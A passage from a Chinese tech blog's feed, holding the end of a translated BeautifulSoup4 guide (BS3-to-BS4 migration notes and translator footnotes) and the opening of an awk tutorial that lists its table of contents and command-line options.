&lt;li&gt;&lt;code&gt;previousSibling&lt;/code&gt; -&amp;gt; &lt;code&gt;previous_sibling&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Beautiful Soup构造方法的参数部分也有名字变化:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;BeautifulSoup(parseOnlyThese=...)&lt;/code&gt; -&amp;gt; &lt;code&gt;BeautifulSoup(parse_only=...)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;BeautifulSoup(fromEncoding=...)&lt;/code&gt; -&amp;gt; &lt;code&gt;BeautifulSoup(from_encoding=...)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;为了适配Python3,修改了一个方法名:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Tag.has_key()&lt;/code&gt; -&amp;gt; &lt;code&gt;Tag.has_attr()&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;修改了一个属性名,让它看起来更专业点:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Tag.isSelfClosing&lt;/code&gt; -&amp;gt; &lt;code&gt;Tag.is_empty_element&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;修改了下面3个属性的名字,以免雨Python保留字冲突.这些变动不是向下兼容的,如果在BS3中使用了这些属性,那么在BS4中这些代码无法执行.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;UnicodeDammit.Unicode -&amp;gt; UnicodeDammit.Unicode_markup``&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Tag.next&lt;/code&gt; -&amp;gt; &lt;code&gt;Tag.next_element&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Tag.previous&lt;/code&gt; -&amp;gt; &lt;code&gt;Tag.previous_element&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;生成器&quot;&gt;&lt;a href=&quot;#生成器&quot; class=&quot;headerlink&quot; title=&quot;生成器&quot;&gt;&lt;/a&gt;生成器&lt;/h3&gt;&lt;p&gt;将下列生成器按照PEP8标准重新命名,并转换成对象的属性:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;childGenerator()&lt;/code&gt; -&amp;gt; &lt;code&gt;children&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;nextGenerator()&lt;/code&gt; -&amp;gt; &lt;code&gt;next_elements&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;nextSiblingGenerator()&lt;/code&gt; -&amp;gt; &lt;code&gt;next_siblings&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;previousGenerator()&lt;/code&gt; -&amp;gt; &lt;code&gt;previous_elements&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;previousSiblingGenerator()&lt;/code&gt; -&amp;gt; &lt;code&gt;previous_siblings&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;recursiveChildGenerator()&lt;/code&gt; -&amp;gt; &lt;code&gt;descendants&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;parentGenerator()&lt;/code&gt; -&amp;gt; &lt;code&gt;parents&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;所以迁移到BS4版本时要替换这些代码:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;for parent in tag.parentGenerator():&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ...&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;替换为:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;for parent in tag.parents:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ...&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;(两种调用方法现在都能使用)&lt;/p&gt;
&lt;p&gt;BS3中有的生成器循环结束后会返回 &lt;code&gt;None&lt;/code&gt; 然后结束.这是个bug.新版生成器不再返回 &lt;code&gt;None&lt;/code&gt; .&lt;/p&gt;
&lt;p&gt;BS4中增加了2个新的生成器, &lt;a href=&quot;#strings-stripped-strings&quot;&gt;.strings 和 stripped_strings&lt;/a&gt; . &lt;code&gt;.strings&lt;/code&gt; 生成器返回NavigableString对象, &lt;code&gt;.stripped_strings&lt;/code&gt; 方法返回去除前后空白的Python的string对象.&lt;/p&gt;
&lt;h3 id=&quot;XML&quot;&gt;&lt;a href=&quot;#XML&quot; class=&quot;headerlink&quot; title=&quot;XML&quot;&gt;&lt;/a&gt;XML&lt;/h3&gt;&lt;p&gt;BS4中移除了解析XML的 &lt;code&gt;BeautifulStoneSoup&lt;/code&gt; 类.如果要解析一段XML文档,使用 &lt;code&gt;BeautifulSoup&lt;/code&gt; 构造方法并在第二个参数设置为“xml”.同时 &lt;code&gt;BeautifulSoup&lt;/code&gt; 构造方法也不再识别 &lt;code&gt;isHTML&lt;/code&gt; 参数.&lt;/p&gt;
&lt;p&gt;Beautiful Soup处理XML空标签的方法升级了.旧版本中解析XML时必须指明哪个标签是空标签. 构造方法的 &lt;code&gt;selfClosingTags&lt;/code&gt; 参数已经不再使用.新版Beautiful Soup将所有空标签解析为空元素,如果向空元素中添加子节点,那么这个元素就不再是空元素了.&lt;/p&gt;
&lt;h3 id=&quot;实体&quot;&gt;&lt;a href=&quot;#实体&quot; class=&quot;headerlink&quot; title=&quot;实体&quot;&gt;&lt;/a&gt;实体&lt;/h3&gt;&lt;p&gt;HTML或XML实体都会被解析成Unicode字符,Beautiful Soup 3版本中有很多处理实体的方法,在新版中都被移除了. &lt;code&gt;BeautifulSoup&lt;/code&gt; 构造方法也不再接受 &lt;code&gt;smartQuotesTo&lt;/code&gt; 或 &lt;code&gt;convertEntities&lt;/code&gt; 参数. &lt;a href=&quot;#unicode-dammit&quot;&gt;编码自动检测&lt;/a&gt; 方法依然有 &lt;code&gt;smart_quotes_to&lt;/code&gt; 参数,但是默认会将引号转换成Unicode.内容配置项 &lt;code&gt;HTML_ENTITIES&lt;/code&gt; , &lt;code&gt;XML_ENTITIES&lt;/code&gt; 和 &lt;code&gt;XHTML_ENTITIES&lt;/code&gt; 在新版中被移除.因为它们代表的特性已经不再被支持.&lt;/p&gt;
&lt;p&gt;如果在输出文档时想把Unicode字符转换成HTML实体,而不是输出成UTF-8编码,那就需要用到 &lt;a href=&quot;#id47&quot;&gt;输出格式&lt;/a&gt; 的方法.&lt;/p&gt;
&lt;h3 id=&quot;迁移杂项&quot;&gt;&lt;a href=&quot;#迁移杂项&quot; class=&quot;headerlink&quot; title=&quot;迁移杂项&quot;&gt;&lt;/a&gt;迁移杂项&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;#string&quot;&gt;Tag.string&lt;/a&gt; 属性现在是一个递归操作.如果A标签只包含了一个B标签,那么A标签的.string属性值与B标签的.string属性值相同.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;#id12&quot;&gt;多值属性&lt;/a&gt; 比如 &lt;code&gt;class&lt;/code&gt; 属性包含一个他们的值的列表,而不是一个字符串.这可能会影响到如何按照CSS类名哦搜索tag.&lt;/p&gt;
&lt;p&gt;如果使用 &lt;code&gt;find*&lt;/code&gt; 方法时同时传入了 &lt;a href=&quot;#text&quot;&gt;text 参数&lt;/a&gt; 和 &lt;a href=&quot;#id32&quot;&gt;name 参数&lt;/a&gt; .Beautiful Soup会搜索指定name的tag,并且这个tag的 &lt;a href=&quot;#string&quot;&gt;Tag.string&lt;/a&gt; 属性包含text参数的内容.结果中不会包含字符串本身.旧版本中Beautiful Soup会忽略掉tag参数,只搜索text参数.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;BeautifulSoup&lt;/code&gt; 构造方法不再支持 markupMassage 参数.现在由解析器负责文档的解析正确性.&lt;/p&gt;
&lt;p&gt;很少被用到的几个解析器方法在新版中被移除,比如 &lt;code&gt;ICantBelieveItsBeautifulSoup&lt;/code&gt; 和 &lt;code&gt;BeautifulSOAP&lt;/code&gt; .现在由解析器完全负责如何解释模糊不清的文档标记.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;prettify()&lt;/code&gt; 方法在新版中返回Unicode字符串,不再返回字节流.&lt;/p&gt;
&lt;h1 id=&quot;附录&quot;&gt;&lt;a href=&quot;#附录&quot; class=&quot;headerlink&quot; title=&quot;附录&quot;&gt;&lt;/a&gt;附录&lt;/h1&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;[1]&lt;/td&gt;
&lt;td&gt;BeautifulSoup的google讨论组不是很活跃,可能是因为库已经比较完善了吧,但是作者还是会很热心的尽量帮你解决问题的.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;[2]&lt;/td&gt;
&lt;td&gt;文档被解析成树形结构,所以下一步解析过程应该是当前节点的子节点&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;[3]&lt;/td&gt;
&lt;td&gt;过滤器只能作为搜索文档的参数,或者说应该叫参数类型更为贴切,原文中用了 &lt;code&gt;filter&lt;/code&gt; 因此翻译为过滤器&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;[4]&lt;/td&gt;
&lt;td&gt;元素参数,HTML文档中的一个tag节点,不能是文本节点&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;[5]&lt;/td&gt;
&lt;td&gt;采用先序遍历方式&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;[6]&lt;/td&gt;
&lt;td&gt;CSS选择器是一种单独的文档搜索语法, 参考 &lt;a href=&quot;http://www.w3school.com.cn/css/css_selector_type.asp&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.w3school.com.cn/css/css_selector_type.asp&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;[7]&lt;/td&gt;
&lt;td&gt;原文写的是 html5lib, 译者觉得这是原文档的一个笔误&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;[8]&lt;/td&gt;
&lt;td&gt;wrap含有包装,打包的意思,但是这里的包装不是在外部包装而是将当前tag的内部内容包装在一个tag里.包装原来内容的新tag依然在执行 &lt;a href=&quot;#wrap&quot;&gt;wrap()&lt;/a&gt; 方法的tag内&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;[9]&lt;/td&gt;
&lt;td&gt;文档中特殊编码字符被替换成特殊字符(通常是�)的过程是Beautful Soup自动实现的,如果想要多种编码格式的文档被完全转换正确,那么,只好,预先手动处理,统一编码格式&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;[10]&lt;/td&gt;
&lt;td&gt;智能引号,常出现在microsoft的word软件中,即在某一段落中按引号出现的顺序每个引号都被自动转换为左引号,或右引号.&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;原文: &lt;a href=&quot;http://www.crummy.com/software/BeautifulSoup/bs4/doc/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.crummy.com/software/BeautifulSoup/bs4/doc/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;翻译: delong&lt;/p&gt;
&lt;p&gt;查看 &lt;a href=&quot;http://www.crummy.com/software/BeautifulSoup/bs3/documentation.zh.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;BeautifulSoup3 文档&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://www.crummy.com/software/BeautifulSoup/bs4/doc/_images/6.1.jpg&quot; alt=&quot;http://www.crummy.com/software/BeautifulSoup/bs4/doc/_images/6.1.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.crummy.com/software/BeautifulSoup/&quot;&gt;Beautiful Soup&lt;/a&gt; 是一个可以从HTML或XML文件中提取数据的Python库.它能够通过你喜欢的转换器实现惯用的文档导航,查找,修改文档的方式.Beautiful Soup会帮你节省数小时甚至数天的工作时间.&lt;/p&gt;
&lt;p&gt;这篇文档介绍了BeautifulSoup4中所有主要特性,并切有小例子.让我来向你展示它适合做什么,如何工作,怎样使用,如何达到你想要的效果,和处理异常情况.&lt;/p&gt;
&lt;p&gt;文档中出现的例子在Python2.7和Python3.2中的执行结果相同&lt;/p&gt;
&lt;p&gt;你可能在寻找 &lt;a href=&quot;http://www.crummy.com/software/BeautifulSoup/bs3/documentation.html&quot;&gt;Beautiful Soup3&lt;/a&gt; 的文档,Beautiful Soup 3 目前已经停止开发,我们推荐在现在的项目中使用Beautiful Soup 4, &lt;a href=&quot;http://www.baidu.com&quot;&gt;移植到BS4&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="python" scheme="http://it-ebooks.flygon.net/tags/python/"/>
    
      <category term="beautifulsoup" scheme="http://it-ebooks.flygon.net/tags/beautifulsoup/"/>
    
  </entry>
  
  <entry>
    <title>Awk 学习笔记</title>
    <link href="http://it-ebooks.flygon.net/awk-note/"/>
    <id>http://it-ebooks.flygon.net/awk-note/</id>
    <published>2016-03-12T13:05:42.000Z</published>
    <updated>2016-03-13T03:33:21.557Z</updated>
    
    <content type="html">&lt;p&gt;整理：Jims of &lt;a href=&quot;http://www.ringkee.com&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;肥肥世家&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;mailto:jims.yang@gmail.com&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;jims.yang@gmail.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Copyright © 2004 本文遵从GPL协议，欢迎转载、修改、散布。&lt;/p&gt;
&lt;p&gt;第一次发布时间:2004年8月6日&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;&lt;strong&gt;Table of Contents&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#id2874788&quot;&gt;1. awk简介&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#id2875182&quot;&gt;2. awk命令格式和选项&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#id2875104&quot;&gt;2.1. awk的语法有两种形式&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#id2811790&quot;&gt;2.2. 命令选项&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#id2810094&quot;&gt;3. 模式和操作&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#id2810128&quot;&gt;3.1. 模式&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#id2810236&quot;&gt;3.2. 操作&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#id2810288&quot;&gt;4. awk的环境变量&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#id2861410&quot;&gt;5. awk运算符&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#id2861636&quot;&gt;6. 记录和域&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#id2861644&quot;&gt;6.1. 记录&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#id2861680&quot;&gt;6.2. 域&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#id2861697&quot;&gt;6.3. 域分隔符&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#id2861728&quot;&gt;7. gawk专用正则表达式元字符&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#id2861902&quot;&gt;8. POSIX字符集&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#id2861922&quot;&gt;9. 匹配操作符(~)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#id2861937&quot;&gt;10. 比较表达式&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#id2861975&quot;&gt;11. 范围模板&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#id2861992&quot;&gt;12. 一个验证passwd文件有效性的例子&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#id2808705&quot;&gt;13. 几个实例&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#id2808824&quot;&gt;14. awk编程&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#id2808832&quot;&gt;14.1. 变量&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#id2808925&quot;&gt;14.2. BEGIN模块&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#id2808950&quot;&gt;14.3. END模块&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#id2808971&quot;&gt;14.4. 重定向和管道&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#id2809145&quot;&gt;14.5. 条件语句&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#id2809263&quot;&gt;14.6. 循环&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#id2809375&quot;&gt;14.7. 数组&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#id2809497&quot;&gt;14.8. awk的内建函数&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#id2876387&quot;&gt;15. How-to&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;1-awk简介&quot;&gt;&lt;a href=&quot;#1-awk简介&quot; class=&quot;headerlink&quot; title=&quot;1. awk简介&quot;&gt;&lt;/a&gt;1. awk简介&lt;/h2&gt;&lt;p&gt;awk是一种编程语言，用于在linux/unix下对文本和数据进行处理。数据可以来自标准输入、一个或多个文件，或其它命令的输出。它支持用户自定义函数和动态正则表达式等先进功能，是linux/unix下的一个强大编程工具。它在命令行中使用，但更多是作为脚本来使用。awk的处理文本和数据的方式是这样的，它逐行扫描文件，从第一行到最后一行，寻找匹配的特定模式的行，并在这些行上进行你想要的操作。如果没有指定处理动作，则把匹配的行显示到标准输出(屏幕)，如果没有指定模式，则所有被操作所指定的行都被处理。awk分别代表其作者姓氏的第一个字母。因为它的作者是三个人，分别是Alfred Aho、Brian Kernighan、Peter Weinberger。gawk是awk的GNU版本，它提供了Bell实验室和GNU的一些扩展。下面介绍的awk是以GUN的gawk为例的，在linux系统中已把awk链接到gawk，所以下面全部以awk进行介绍。&lt;/p&gt;
&lt;h2 id=&quot;2-awk命令格式和选项&quot;&gt;&lt;a href=&quot;#2-awk命令格式和选项&quot; class=&quot;headerlink&quot; title=&quot;2. awk命令格式和选项&quot;&gt;&lt;/a&gt;2. awk命令格式和选项&lt;/h2&gt;&lt;h3 id=&quot;2-1-awk的语法有两种形式&quot;&gt;&lt;a href=&quot;#2-1-awk的语法有两种形式&quot; class=&quot;headerlink&quot; title=&quot;2.1. awk的语法有两种形式&quot;&gt;&lt;/a&gt;2.1. awk的语法有两种形式&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;awk [options] &amp;#39;script&amp;#39; var=value file(s)&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;awk [options] -f scriptfile var=value file(s)&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;2-2-命令选项&quot;&gt;&lt;a href=&quot;#2-2-命令选项&quot; class=&quot;headerlink&quot; title=&quot;2.2. 命令选项&quot;&gt;&lt;/a&gt;2.2. 命令选项&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;-F fs or --field-separator fs&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;指定输入文件折分隔符，fs是一个字符串或者是一个正则表达式，如-F:。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;-v var=value or --asign var=value&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;赋值一个用户定义变量。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;-f scripfile or --file scriptfile&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;从脚本文件中读取awk命令。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;-mf nnn and -mr nnn&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;对nnn值设置内在限制，-mf选项限制分配给nnn的最大块数目；-mr选项限制记录的最大数目。这两个功能是Bell实验室版awk的扩展功能，在标准awk中不适用。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;-W compact or --compat, -W traditional or --traditional&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在兼容模式下运行awk。所以gawk的行为和标准的awk完全一样，所有的awk扩展都被忽略。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;-W copyleft or --copyleft, -W copyright or --copyright&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;打印简短的版权信息。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;-W help or --help, -W usage or --usage&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;打印全部awk选项和每个选项的简短说明。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;-W lint or --lint&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;打印不能向传统unix平台移植的结构的警告。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;-W lint-old or --lint-old&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;打印关于不能向传统unix平台移植的结构的警告。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;-W posix&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;打开兼容模式。但有以下限制，不识别：\x、函数关键字、func、换码序列以及当fs是一个空格时，将新行作为一个域分隔符；操作符&lt;strong&gt;和&lt;/strong&gt;=不能代替^和^=；fflush无效。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;-W re-interval or --re-inerval&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;允许间隔正则表达式的使用，参考(grep中的Posix字符类)，如括号表达式[[:alpha:]]。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;-W source program-text or --source program-text&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;使用program-text作为源代码，可与-f命令混用。&lt;/p&gt;
